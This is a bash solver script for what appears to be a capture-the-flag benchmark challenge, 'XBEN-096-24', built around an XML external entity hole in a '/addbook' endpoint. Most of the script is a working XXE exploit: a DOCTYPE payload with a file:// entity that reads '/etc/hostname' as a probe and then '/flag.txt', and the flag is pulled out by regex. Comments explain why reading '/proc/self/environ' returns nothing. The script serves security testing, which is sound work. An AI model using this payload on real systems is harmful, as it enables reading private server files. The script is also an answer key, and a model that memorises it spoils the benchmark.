#!/usr/bin/env bash
# XBEN-096-24 — "Library Services" (tags: xxe)
#
# `/addbook` parses posted XML with `resolve_entities=True`, so a declared
# external entity is fetched and inlined into the document it echoes back.
#
# Worth noting the failed first attempt, because it is the usual one: the
# Dockerfile sets the flag as an *environment variable*, so `/proc/self/environ`
# looks like the obvious target. It comes back empty — that file is
# NUL-separated and XML text cannot carry NUL, so the entity expands to nothing
# and the page renders successfully with an empty element. The same Dockerfile
# also writes `/flag.txt`, which is ordinary text and reads out cleanly.
#
# Confirm the primitive on a file that certainly exists (`/etc/hostname`) before
# concluding anything from an empty result.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben096-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

read_file() {
    local target="$1"
    "$H5I" websec replay req_0 --create \
        --set 'method=POST' --set 'path=/addbook' \
        --set "form.xml=<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file://$target\">]><r>&x;</r>" \
        --session "$SESSION" |
        python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])'
}

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# The primitive works when this comes back non-empty.
PROBE="$(read_file /etc/hostname)"
"$H5I" websec match "res_$PROBE" --regex '[a-f0-9]{12}' --session "$SESSION" >/dev/null || {
    echo "entities are not being resolved; the target is not what this expects" >&2
    exit 1
}

REPLAY="$(read_file /flag.txt)"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
